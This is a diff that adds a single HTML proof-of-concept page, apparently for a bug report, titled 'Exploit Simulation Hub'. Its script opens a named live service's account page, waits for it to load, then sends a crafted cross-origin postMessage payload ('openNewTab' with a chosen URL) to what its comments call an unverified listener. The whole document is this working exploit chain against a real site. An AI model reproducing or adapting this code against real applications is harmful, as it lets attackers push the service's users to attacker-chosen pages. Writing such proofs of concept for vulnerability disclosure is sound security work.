@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit Simulation Hub</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; text-align: center; }
+        .btn { padding: 15px 30px; font-size: 18px; background: #ce3021; color: white; border: none; cursor: pointer; border-radius: 5px; }
+        .btn:hover { background: #b0281a; }
+    </style>
+</head>
+<body>
+
+    <h1>Cross-Origin PostMessage Payload Delivery</h1>
+    <p>Click the button below to initiate the window reference chain and deliver the payload.</p>
+    
+    <!-- One click requirement satisfied -->
+    <button class="btn" onclick="launchExploit()">Execute Exploit Chain</button>
+
+    <script>
+        function launchExploit() {
+            // 1. Open the target vulnerable page to capture the window object reference
+            const targetWindow = window.open('https://app.glia.com/account', '_blank');
+
+            // 2. We must wait for the target page to load its scripts and register the event listener.
+            // Direct onload checking is blocked by Same-Origin Policy, so we use a polling timeout.
+            setTimeout(function() {
+                if (targetWindow) {
+                    // 3. Construct the payload structure expected by the unverified listener
+                    const payload = {
+                        type: 'openNewTab',
+                        url: 'https://example.com' // Destination domain
+                    };
+
+                    // 4. Dispatch the postMessage to the target window reference.
+                    // '*' is used because we are forcing cross-origin communication.
+                    targetWindow.postMessage(payload, '*');
+                    console.log('[+] Payload successfully dispatched to target window.');
+                } else {
+                    console.error('[-] Popup blocked or window reference lost.');
+                }
+            }, 3500); // 3.5-second delay to ensure the target DOM and event listeners are ready
+        }
+    </script>
+
+</body>
+</html>
